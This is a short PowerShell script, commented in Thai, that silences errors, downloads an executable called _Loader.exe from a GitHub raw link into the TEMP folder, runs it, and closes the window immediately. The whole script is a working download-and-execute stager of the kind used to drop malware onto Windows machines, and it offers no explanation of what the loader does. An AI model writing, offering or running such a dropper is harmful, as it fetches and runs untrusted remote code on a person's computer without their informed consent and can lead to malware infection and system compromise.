# 1. ตั้งค่าพื้นฐาน
$ErrorActionPreference = "SilentlyContinue"
Clear-Host

# 2. ระบุลิงก์ดาวน์โหลดไฟล์ _Loader.exe (ต้องใช้ลิงก์ RAW เท่านั้น)
$url = "https://raw.githubusercontent.com/lubyralph6-maker/newpower.ps1/main/_Loader.exe"

# 3. กำหนดที่เก็บไฟล์ชั่วคราวในเครื่อง
$dest = "$env:TEMP\_Loader.exe"

# 4. ทำการดาวน์โหลดไฟล์จาก GitHub มาที่เครื่อง
try {
    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
} catch {
    Write-Host "[!] Download Failed: Check your internet or link." -ForegroundColor Red
    Pause
    exit
}

# 5. สั่งรันโปรแกรม และปิดหน้า PowerShell ทันที
if (Test-Path $dest) {
    # รันไฟล์ _Loader.exe ขึ้นมา
    Start-Process -FilePath $dest
    # ปิดหน้าต่างสีน้ำเงินทิ้ง
    exit
} else {
    Write-Host "[!] Error: Cannot find downloaded file." -ForegroundColor Red
    Pause
    exit
}
